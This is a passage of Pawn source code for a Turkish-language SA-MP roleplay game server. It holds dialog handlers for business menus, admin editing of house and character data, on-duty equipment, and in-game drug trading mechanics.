 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][8] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun9], Isyeri[yakindaki][urunfiyat][8]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 69)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 70, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 71, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 70)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun10], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun10], Isyeri[yakindaki][urunfiyat][9]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 71)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][9] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun10], Isyeri[yakindaki][urunfiyat][9]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 72)
	{
	    if(response)
		{
	        new string[128];
	        new yakindaki = IsyeriMesafesi(2.0,playerid);
	        if(yakindaki == 0)
	        {
	            return 1;
			}
	        strmid(Isyeri[yakindaki][karsilama], inputtext, 0, strlen(inputtext), 255);
	        format(string, sizeof(string), "Ýþyeri bilgileri kayýt edildi! Yeni karþýlama metini: %s olarak deðiþtirildi.",inputtext);
	        if(isnull(inputtext))
			{
				format(string, sizeof(string), "Ýþyerinin karþýlama metnini kaldýrdýnýz.");
	        	strdel(Isyeri[yakindaki][karsilama], 0, 128);
			}
	        IsyeriKaydet(yakindaki);
	        Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 73)
	{
	    if(response)
	    {
	        new id = GetPVarInt(playerid, "IsyeriBuy");
	        if(listitem == 0)
	        {
	            if(Karakter[playerid][para]-30 >= 0)
	            {
	                GivePlayerCash(playerid, -30);
	                Isyeri[id][ikasa] += 30;
					if(GetPlayerCan(playerid) < 70) SetPlayerHealth(playerid, GetPlayerCan(playerid)+30);
					if(GetPlayerCan(playerid) >= 70) SetPlayerHealth(playerid, 100.0);
	            }
	        }
	        if(listitem == 1)
	        {
	            if(Karakter[playerid][para]-60 >= 0)
	            {
	                GivePlayerCash(playerid, -60);
	                Isyeri[id][ikasa] += 60;
					if(GetPlayerCan(playerid) < 40) SetPlayerHealth(playerid, GetPlayerCan(playerid)+60);
					if(GetPlayerCan(playerid) >= 40) SetPlayerHealth(playerid, 100.0);
	            }
	        }
	        if(listitem == 2)
	        {
	            if(Karakter[playerid][para]-100 >= 0)
	            {
	                GivePlayerCash(playerid, -100);
	                Isyeri[id][ikasa] += 100;
					SetPlayerHealth(playerid, 100.0);
	            }
	        }
	        if(listitem == 3)
	        {
	            if(Karakter[playerid][para]-100 >= 0)
	            {
	                GivePlayerCash(playerid, -100);
	                Isyeri[id][ikasa] += 100;
				 	SetPlayerHealth(playerid, 100.0);
	            }
	        }
	        if(Isyeri[id][itip] == 2) ApplyAnimationEx(playerid, "FOOD", "EAT_Pizza",4.1,0,1,1,0,0);
	        if(Isyeri[id][itip] == 3) ApplyAnimationEx(playerid, "FOOD", "EAT_Burger",4.1,0,1,1,0,0);
	        if(Isyeri[id][itip] == 4) ApplyAnimationEx(playerid, "FOOD", "EAT_Chicken",4.1,0,1,1,0,0);
	    }
	}
	if(dialogid == 74)
	{
		if(response)
		{
		    new yakindaki = EvMesafesi(2.0,playerid);
			if(yakindaki == 0)
			{
			    return 1;
			}
		    if(listitem == 0)
		    {
		        ShowPlayerDialog(playerid, 75, DIALOG_STYLE_INPUT, "Ev konumunu düzenleyin!", "Eski ev konumu loglara kaydedildi.\nYeni ev konumunu girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 76, DIALOG_STYLE_INPUT, "Ev sahibini düzenleyin!", "Eski ev sahibi loglara kaydedildi.\nYeni ev sahibinin SQLid deðerini girin:", "Onayla", "Kapat");
			}
			if(listitem == 2)
			{
			    ShowPlayerDialog(playerid, 77, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev giriþ X deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 3)
			{
			    ShowPlayerDialog(playerid, 78, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev giriþ Y deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 4)
			{
			    ShowPlayerDialog(playerid, 79, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev giriþ Z deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 5)
			{
			    ShowPlayerDialog(playerid, 80, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev giriþ VW deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 6)
			{
			    ShowPlayerDialog(playerid, 81, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev giriþ INT deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 7)
			{
			    ShowPlayerDialog(playerid, 82, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev giriþ ANGLE deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 8)
			{
			    ShowPlayerDialog(playerid, 83, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev cikisX deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 9)
			{
			    ShowPlayerDialog(playerid, 84, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev cikisY deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 10)
			{
			    ShowPlayerDialog(playerid, 85, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev cikisZ deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 11)
			{
			    ShowPlayerDialog(playerid, 86, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev cikis INT deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 12)
			{
			    ShowPlayerDialog(playerid, 87, DIALOG_STYLE_INPUT, "Ev koordinatlarýný düzenleyin!", "Eski ev cikis ANGLE deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 13)
			{
			    ShowPlayerDialog(playerid, 88, DIALOG_STYLE_INPUT, "Ev fiyatýný düzenleyin!", "Eski ev fiyatý loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 14)
			{
			    ShowPlayerDialog(playerid, 89, DIALOG_STYLE_INPUT, "Ev kilit durumunu düzenleyin!", "Eski ev kilit deðeri loglara kaydedildi.\n1 KÝLÝTLÝ - 0 AÇIK\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 15)
			{
			    ShowPlayerDialog(playerid, 284, DIALOG_STYLE_INPUT, "Ev kira durumunu düzenleyin!", "Eski ev durumu deðeri loglara kaydedildi.\n1 KÝRALIK - 0 DEÐÝL\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 16)
			{
			    ShowPlayerDialog(playerid, 285, DIALOG_STYLE_INPUT, "Ev kirayalaný düzenleyin!", "Eski ev kiralayan loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 17)
			{
			    ShowPlayerDialog(playerid, 286, DIALOG_STYLE_INPUT, "Ev kira fiyatýný düzenleyin!", "Eski ev kira fiyatý deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
		}
	}
	if(dialogid == 75)
	{
        new yakindaki = EvMesafesi(2.0,playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new string[128];
	        if(yakindaki == 0)
	        {
	            return 1;
			}
	        strmid(Ev[yakindaki][ekonum], inputtext, 0, strlen(inputtext), 255);
	        EvKaydet(yakindaki);
	        format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev konumu: %s olarak deðiþtirildi.",inputtext);
	        Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
	}
	if(dialogid == 76)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new sahip = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][esahip] = sahip;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev sahibi: %d olarak deðiþtirildi.", sahip);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 77)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyx = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][girisX] = isyx;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev girisX degeri: %f olarak degistirildi.", isyx);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 78)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyy = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][girisY] = isyy;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev girisY degeri: %f olarak degistirildi.", isyy);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 79)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyz = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][girisZ] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev girisZ degeri: %f olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 80)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][egirisvw] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev girisVW degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 81)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][egirisint] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev girisINT degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 82)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][egirisangle] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev egirisangle degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 83)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyx = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][cikisX] = isyx;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev cikisX degeri: %f olarak degistirildi.", isyx);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 84)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyy = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][cikisY] = isyy;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev cikisY degeri: %f olarak degistirildi.", isyy);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 85)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyz = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][cikisZ] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev cikisZ degeri: %f olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 86)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][ecikisint] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev cikisINT degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 87)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][ecikisangle] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev cikisANGLE degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 88)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][efiyat] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev fiyat degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 89)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][ekilit] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev kilit degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 90)
	{
	    return 1;
	}
	if(dialogid == 91)
	{
	    if(response)
	    {
		    if(listitem == 0) { Karakter[playerid][isbasiskin] = 265; SetPlayerSkin(playerid, 265); Bilgi(playerid, "Ýþbaþý yaptýnýz.");	}
		    if(listitem == 1) { Karakter[playerid][isbasiskin] = 266; SetPlayerSkin(playerid, 266); Bilgi(playerid, "Ýþbaþý yaptýnýz.");    }
		    if(listitem == 2) { Karakter[playerid][isbasiskin] = 267; SetPlayerSkin(playerid, 267);	Bilgi(playerid, "Ýþbaþý yaptýnýz.");	}
		    if(listitem == 3) { Karakter[playerid][isbasiskin] = 280; SetPlayerSkin(playerid, 280); Bilgi(playerid, "Ýþbaþý yaptýnýz.");	}
		    if(listitem == 4) { Karakter[playerid][isbasiskin] = 281; SetPlayerSkin(playerid, 281);	Bilgi(playerid, "Ýþbaþý yaptýnýz.");	}
		    if(listitem == 5) { Karakter[playerid][isbasiskin] = 284; SetPlayerSkin(playerid, 284); Bilgi(playerid, "Ýþbaþý yaptýnýz.");	}
		    if(listitem == 6) { Karakter[playerid][isbasiskin] = 300; SetPlayerSkin(playerid, 300); Bilgi(playerid, "Ýþbaþý yaptnýýz.");    }
		    if(listitem == 7) { Karakter[playerid][isbasiskin] = 301; SetPlayerSkin(playerid, 301); Bilgi(playerid, "Ýþbaþý yaptýnýz.");    }
		    if(listitem == 8) { Karakter[playerid][isbasiskin] = 306; SetPlayerSkin(playerid, 306); Bilgi(playerid, "Ýþbaþý yaptýnýz.");    }
		    if(listitem == 9) { Karakter[playerid][isbasiskin] = 307; SetPlayerSkin(playerid, 307); Bilgi(playerid, "Ýþbaþý yaptýnýz.");    }
		    if(listitem == 10) { Karakter[playerid][isbasiskin] = GetPlayerSkin(playerid); Bilgi(playerid, "Ýþbaþý yaptýnýz.");    }
			Karakter[playerid][isbasi] = 1;
			SetPlayerColor(playerid, 0x8D8DFFFF);
			//SetPlayerArmour(playerid, 20);
	   		GivePlayerWeapon(playerid, 3, 1);
	        GivePlayerWeapon(playerid, 41, 1000);
	        GivePlayerWeapon(playerid, 24, 50);
   			new string2[34];
			format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
			UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
			KarakterKaydet(playerid);
	    }
	    return 1;
	}


	if(dialogid == 100)
	{
	    if(response)
	    {
			new utoplaid;
			utoplaid = GetPVarInt(playerid, "UyusturucuToplaID");
			ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);

	 	    Uyusturucu[utoplaid][udurum] = 0;
            Uyusturucu[utoplaid][utip] = 0;
	 	    Uyusturucu[utoplaid][udakika] = 0;
	 	    Uyusturucu[utoplaid][uz] -= 0.4;
	 	    DestroyDynamicObject(Uyusturucu[utoplaid][uobje]);
	 	    DestroyDynamic3DTextLabel(Uyusturucu[utoplaid][ulabel]);
    		Uyusturucu[utoplaid][uobje] = CreateDynamicObject(2203, Uyusturucu[utoplaid][ux], Uyusturucu[utoplaid][uy], Uyusturucu[utoplaid][uz], 0.0, 0.0, 0.0, Uyusturucu[utoplaid][uvworld], Uyusturucu[utoplaid][uinterior]);
	 	    UyusturucuKaydet(utoplaid);

	 	    Bilgi(playerid, "Bu bitkinin ürünleri kullanýlabilir durumda deðil.");

	    }
	    return 1;
	}
	if(dialogid == 101)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][uesrar]-miktar >= 0)
			{
			    Karakter[giveplayerid][uesrar] -= miktar;
			    Karakter[playerid][uesrar] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 102)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][uesrar]-miktar >= 0)
			{
			    Karakter[giveplayerid][uesrar] -= miktar;
			    Karakter[playerid][uesrar] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 103)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				ShowPlayerDialog(playerid, 104, DIALOG_STYLE_INPUT, "Ýsim Deðiþtirme", "Deðiþtirmek istediðiniz ismi giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 1)
	        {
				ShowPlayerDialog(playerid, 105, DIALOG_STYLE_INPUT, "Þifre Deðiþtirme", "Deðiþtirmek istediðiniz þifreyi giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 2)
	        {
				ShowPlayerDialog(playerid, 106, DIALOG_STYLE_INPUT, "Interior Deðiþtirme", "Deðiþtirmek istediðiniz interior giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 3)
	        {
				ShowPlayerDialog(playerid, 107, DIALOG_STYLE_INPUT, "Virtual World Deðiþtirme", "Deðiþtirmek istediðiniz virtual world giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 4)
	        {
				ShowPlayerDialog(playerid, 108, DIALOG_STYLE_INPUT, "Seviye Deðiþtirme", "Deðiþtirmek istediðiniz seviyeyi giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 5)
	        {
				ShowPlayerDialog(playerid, 109, DIALOG_STYLE_INPUT, "Seviye Puaný Deðiþtirme", "Deðiþtirmek istediðiniz seviye puanýný giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 6)
	        {
				ShowPlayerDialog(playerid, 110, DIALOG_STYLE_INPUT, "Skin Deðiþtirme", "Deðiþtirmek istediðiniz skin id giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 7)
	        {
				ShowPlayerDialog(playerid, 111, DIALOG_STYLE_INPUT, "Health Deðiþtirme", "Deðiþtirmek istediðiniz health giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 8)
	        {
				ShowPlayerDialog(playerid, 112, DIALOG_STYLE_INPUT, "Armour Deðiþtirme", "Deðiþtirmek istediðiniz armour giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 9)
	        {
				ShowPlayerDialog(playerid, 113, DIALOG_STYLE_INPUT, "Dil Deðiþtirme", "Deðiþtirmek istediðiniz dil numarasýný giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 10)
	        {
				ShowPlayerDialog(playerid, 114, DIALOG_STYLE_INPUT, "Yaþ Deðiþtirme", "Deðiþtirmek istediðiniz yaþý giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 11)
	        {
				ShowPlayerDialog(playerid, 115, DIALOG_STYLE_INPUT, "Cinsiyet Deðiþtirme", "Deðiþtirmek istediðiniz cinsiyeti giriniz:\nErkek için: 1 - Kadýn için: 2", "Tamam", "Geri");
	        }
	        if(listitem == 12)
	        {
				ShowPlayerDialog(playerid, 116, DIALOG_STYLE_INPUT, "Ten Rengi Deðiþtirme", "Deðiþtirmek istediðiniz ten rengini giriniz:\nSiyahi için: 1 - Beyaz için: 2", "Tamam", "Geri");
	        }
	        if(listitem == 13)
	        {
				ShowPlayerDialog(playerid, 117, DIALOG_STYLE_INPUT, "Birlik Deðiþtirme", "Deðiþtirmek istediðiniz birlik id giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 14)
	        {
				ShowPlayerDialog(playerid, 118, DIALOG_STYLE_INPUT, "Birlik Rütbe Deðiþtirme", "Deðiþtirmek istediðiniz rütbeyi giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 15)
	        {
				ShowPlayerDialog(playerid, 119, DIALOG_STYLE_INPUT, "Kodes Süresi Deðiþtirme", "Deðiþtirmek istediðiniz kodes süresini giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 16)
	        {
				ShowPlayerDialog(playerid, 120, DIALOG_STYLE_INPUT, "A-Jail Süresi Deðiþtirme", "Deðiþtirmek istediðiniz ajail süresini giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 17)
	        {
				ShowPlayerDialog(playerid, 121, DIALOG_STYLE_INPUT, "Telefon NO Deðiþtirme", "Deðiþtirmek istediðiniz telefon numrasýný giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 18)
	        {
				ShowPlayerDialog(playerid, 141, DIALOG_STYLE_INPUT, "Chat Stili Deðiþtirme", "Deðiþtirmek istediðiniz chat stilini giriniz(1-7):", "Tamam", "Geri");
	        }
	        if(listitem == 19)
	        {
				ShowPlayerDialog(playerid, 148, DIALOG_STYLE_INPUT, "Meslek Deðiþtirme", "Deðiþtirmek istediðiniz mesleði giriniz(rakam):", "Tamam", "Geri");
	        }
	        if(listitem == 20)
	        {
				ShowPlayerDialog(playerid, 171, DIALOG_STYLE_INPUT, "Uyuþturucu Deðiþtirme", "Deðiþtirmek istediðiniz uyuþturucu miktarýný giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 21)
	        {
				ShowPlayerDialog(playerid, 172, DIALOG_STYLE_INPUT, "Saksý Deðiþtirme", "Deðiþtirmek istediðiniz saksý miktarýný giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 22)
	        {
				ShowPlayerDialog(playerid, 173, DIALOG_STYLE_INPUT, "Tohum Deðiþtirme", "Deðiþtirmek istediðiniz esrar tohum miktarýný giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 23)
	        {
				ShowPlayerDialog(playerid, 202, DIALOG_STYLE_INPUT, "Kas Seviyesi Deðiþtirme", "Deðiþtirmek istediðiniz kas seviyesini giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 24)
	        {
				ShowPlayerDialog(playerid, 203, DIALOG_STYLE_INPUT, "Kas Puaný Deðiþtirme", "Deðiþtirmek istediðiniz kas puanýný giriniz:", "Tamam", "Geri");
	        }
	        if(listitem == 25) SetPVarInt(playerid, "MatSec", 1), ShowPlayerDialog(playerid, 275, DIALOG_STYLE_INPUT, "Materyal Deðiþtirme", "Deðiþtirmek istediðiniz materyal miktarýný giriniz:", "Tamam", "Geri");
	        if(listitem == 26) SetPVarInt(playerid, "MatSec", 2), ShowPlayerDialog(playerid, 275, DIALOG_STYLE_INPUT, "Materyal Deðiþtirme", "Deðiþtirmek istediðiniz materyal miktarýný giriniz:", "Tamam", "Geri");
	        if(listitem == 27) SetPVarInt(playerid, "MatSec", 3), ShowPlayerDialog(playerid, 275, DIALOG_STYLE_INPUT, "Materyal Deðiþtirme", "Deðiþtirmek istediðiniz materyal miktarýný giriniz:", "Tamam", "Geri");
	        if(listitem == 28) SetPVarInt(playerid, "MatSec", 4), ShowPlayerDialog(playerid, 275, DIALOG_STYLE_INPUT, "Materyal Deðiþtirme", "Deðiþtirmek istediðiniz materyal miktarýný giriniz:", "Tamam", "Geri");
	        if(listitem == 29) SetPVarInt(playerid, "MatSec", 5), ShowPlayerDialog(playerid, 275, DIALOG_STYLE_INPUT, "Materyal Deðiþtirme", "Deðiþtirmek istediðiniz materyal miktarýný giriniz:", "Tamam", "Geri");
		}
	    else KDuzenleVar[playerid] = 0;
	}
	if(dialogid == 104)
	{
	    new giveplayerid = KDuzenleVar[playerid];
		new string[128];
	    if(response)
	    {
	        format(string, sizeof(string), "[CHANGENAME] %s adli oyuncunun karakter adi %s tarafindan %s olarak degistirildi.", OyuncuAdiniBul(giveplayerid), OyuncuAdiniBul(playerid), inputtext);
	        Log(playerid, string);
	        printf(string);
	        format(string, sizeof(string), "[CHANGENAME] %s adli oyuncunun karakter adi %s tarafindan %s olarak degistirildi.", OyuncuAdiniBul(giveplayerid), OyuncuAdiniBul(playerid), inputtext);
	        Log(giveplayerid, string);
         	SetPlayerName(giveplayerid, inputtext);
	        KarakterKaydet(giveplayerid);
	        new query[128];
			new _text[MAX_PLAYER_NAME+2];
